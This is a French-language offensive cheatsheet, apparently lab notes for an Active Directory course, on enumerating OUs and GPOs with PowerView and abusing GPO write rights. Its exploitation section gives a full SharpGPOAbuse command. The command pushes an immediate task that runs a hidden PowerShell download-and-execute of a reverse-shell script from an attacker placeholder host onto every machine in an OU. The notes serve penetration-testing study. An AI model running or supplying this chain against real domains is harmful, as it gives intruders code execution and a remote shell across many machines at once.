# Cheatsheet - GPO et OU

> [!summary] Objectif
> Lister les OU, relier une OU à sa GPO (`gplink`) et recouper les ACL des policies. Ordre à garder : OU → gplink → GPO → ACL.

> [!abstract] Pourquoi · Chaînage
> Couche **identité (AD)**. **Repérer** quelle GPO frappe quelle OU (gplink) = flag · **Exploiter** = droit d'écriture sur la GPO → SharpGPOAbuse → code sur toutes les machines de l'OU.
> **Prérequis** write sur la GPO → **débloque** exec/admin sur les machines liées.

### OU enumeration

```powershell
. C:\AD\Tools\PowerView.ps1
Get-DomainOU | Select-Object -ExpandProperty name
(Get-DomainOU -Identity DevOps).distinguishedname | %{Get-DomainComputer -SearchBase $_} | Select-Object name
```

### List and read GPOs

```powershell
Get-DomainGPO
Get-DomainGPO -Identity "DevOps Policy"
```

### Resolve a GPO from OU gplink

```powershell
(Get-DomainOU -Identity DevOps).gplink
Get-DomainGPO -Identity (Get-DomainOU -Identity DevOps).gplink.substring(11,(Get-DomainOU -Identity DevOps).gplink.length-72)
```

Pour lister les GPO d'une OU, lister les OU et récuperer les GUID pour en lister les GPO
```powershell
Get-DomainGPO -Identity "{7478F170-6A0C-490C-B355-9E4618BC785D}"
```

### GPO inheritance via AD module (variante pour F03)

```powershell
Import-Module C:\AD\Tools\ADModulemaster\ActiveDirectory\ActiveDirectory.psd1
Get-GPInheritance -Target (Get-ADOrganizationalUnit -Filter 'name -eq "StudentMachines"').DistinguishedName
```

### Exploitation - SharpGPOAbuse (write GPO → RCE sur toutes les machines de l'OU)

```powershell
# --AddComputerTask pousse une Immediate Task côté ordinateur (flag F09)
C:\AD\Tools\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author NT\SYSTEM `
  --Command "cmd.exe" --Arguments "/c powershell -nop -w hidden -c iex(iwr http://<ATTAQUANT>:8080/rev.ps1 -UseBasicParsing)" `
  --GPOName "<NOM_GPO>"
```

### Vérifier l'attribut GPO modifié après abus

```powershell
# gPCMachineExtensionNames (Computer task/script) ou gPCUserExtensionNames (User task) + versionNumber bump
Get-DomainGPO -Identity "<NOM_GPO>" | Select-Object displayname,gPCMachineExtensionNames,gPCUserExtensionNames,versionNumber
```

> [!note] Ne pas confondre `displayname` et `name/GUID`. BloodHound (`Search: Applocked / DevOps` → Inbound Object Control) lit plus vite `GenericAll` / `WriteDACL` sur les policies.

## Related
- [[Cheatsheet - ACL et droits AD]]
- [[Cheatsheet - Monitoring et détections]]
- [[Synthèse - ACL et GPO]]
